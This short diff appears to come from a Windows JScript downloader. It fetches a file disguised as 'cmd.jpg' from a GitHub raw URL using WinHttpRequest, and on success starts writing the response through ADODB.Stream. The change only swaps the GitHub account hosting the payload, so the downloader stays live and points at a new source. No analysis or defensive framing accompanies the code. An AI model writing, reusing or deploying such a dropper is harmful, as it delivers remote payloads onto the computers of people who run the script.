@@ -1,5 +1,5 @@
 var Object = WScript.CreateObject("WinHttp.WinHttpRequest.5.1");
-Object.open("GET", "https://raw.githubusercontent.com/lovesecret77/test123/master/cmd.jpg", false);
+Object.open("GET", "https://raw.githubusercontent.com/justtest1314/test123/master/cmd.jpg", false);
 Object.send();
 if (Object.Status == 200) {
 	var Stream = WScript.CreateObject("ADODB.Stream");
